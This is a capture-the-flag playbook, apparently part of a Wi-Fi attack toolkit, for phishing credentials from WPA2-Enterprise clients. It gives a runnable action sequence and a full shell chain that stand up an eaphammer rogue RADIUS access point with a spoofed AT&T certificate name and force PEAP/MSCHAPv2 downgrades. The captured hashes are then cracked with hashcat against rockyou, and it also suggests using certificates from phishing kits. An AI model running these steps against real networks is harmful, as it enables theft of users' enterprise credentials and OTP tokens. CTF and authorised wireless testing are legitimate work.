# Cert-phish EAP flags — weak validation reveals the flag

An enterprise client with weak certificate validation associates to
your rogue RADIUS. The inner-EAP exchange reveals a credential, an
MDM token, or a plaintext GTC prompt whose value is the flag.

## Recognition

- Target network is WPA2-Enterprise (RSN AKM 1 = 802.1X).
- Client OS visible in probes / OUI. Enterprise builds of iOS/Android
  vary in cert validation strictness; hostapd-wpe logs whether the
  client accepted an untrusted server cert.
- Absence of Passpoint OSU with proper pinning.

## The one-shot sequence

```python
run_sequence([
    {"action": "recon_start", "band": "abg", "dwell_ms": 250},
    {"action": "wait", "s": 10},
    {"action": "recon_stop"},

    # 1. Bring up a rogue RADIUS + hostapd with a mismatched cert.
    #    eaphammer wraps this into one command.
    {"action": "eaphammer_rogue",
     "essid": "<target ESSID>",
     "auth": "wpa-eap",
     "channel": 6,
     "negotiate": "manual",
     "phase_1_methods": "PEAP",
     "phase_2_methods": "MSCHAPV2",
     "hostile_portal": False,
     "cert_cn": "<pick a plausible CN — e.g. attwifi.att.net>"},

    # 2. Wait for association attempts.
    {"action": "wait", "s": 300},

    # 3. Read captured chal/resp + inner-method output.
    {"action": "eaphammer_dump_creds"},
])
```

## MCP mapping / fallback

`eaphammer_rogue` and `eaphammer_dump_creds` are **not in `src/`** —
the current MCP `do_create_rogue_ap` only supports open/WPA-PSK, not
WPA-EAP. Drive `eaphammer` on the attack host directly.

**Fallback shell chain:**

```bash
# 1. one-shot rogue-RADIUS + rogue AP
sudo eaphammer --interface wlan0 \
    --essid "<target ESSID>" \
    --auth wpa-eap \
    --creds \
    --channel 6 \
    --negotiate manual \
    --phase-1-methods PEAP \
    --phase-2-methods MSCHAPV2 \
    --cn "attwifi.att.net"

# 2. read logged creds
cat /root/eaphammer/loot/hostapd-*.creds
# or feed straight into hashcat
hashcat -m 5500 <alice-hash-line> /opt/wordlists/rockyou.txt
```

For hostapd-wpe as an alternative, see `rogue-radius-eap-flag.md` Path A.

## The flag surface

- **MSCHAPv2 challenge/response** (crack with hashcat 5500 or
  asleap → recovered NT-hash / plaintext password).
- **EAP-GTC plaintext token** — RSA / Duo / Yubico OTP surfacing in
  a rogue-tunnel prompt. The token itself may be the flag.
- **MDM profile theft** — client offers a device-provisioning payload
  once "authenticated"; the payload embeds the flag.
- **Client's provided username** — some CTFs put the flag in the
  outer-identity string.

## Failure modes

- **Client validates the cert.** Modern (2024+) iOS + managed
  Windows validate strictly. Attack does not fire. Need a matching
  cert (extracted from a phishing kit or a domain the client trusts).
- **PEAP peer refuses downgrade.** Some clients pin the inner method
  in the profile. `--negotiate weakest` in eaphammer offers PEAP
  → GTC / MSCHAPv2 / MD5; the client may reject.
- **No 802.1X clients probing.** WCTF puzzles usually seed the
  puzzle with a target STA; if you see none, the puzzle is not
  cert-phish-flavored.

## Companion topics

- `enterprise/` walkthrough (rogue RADIUS + inner-EAP downgrade).
- `hostapd-wpe/` — the patchset that logs the material.
- `eaphammer/` — the higher-level orchestrator.

## Cite

- attacks.json: `cert-phish-eaphammer-weak-validation`,
  `rogue-radius-eaphammer`, `rogue-radius-hostapd-wpe`,
  `eap-inner-downgrade-peap-mschapv2`,
  `eap-inner-downgrade-peap-gtc`,
  `eap-gtc-plaintext-token-capture`,
  `mschapv2-challenge-response-capture`,
  `hashcat-5500-mschapv2-crack`,
  `asleap-mschapv2-crack`,
  `mdm-profile-theft-captive-portal`.
- Gabriel Ryan — eaphammer DEFCON/BSides talks.
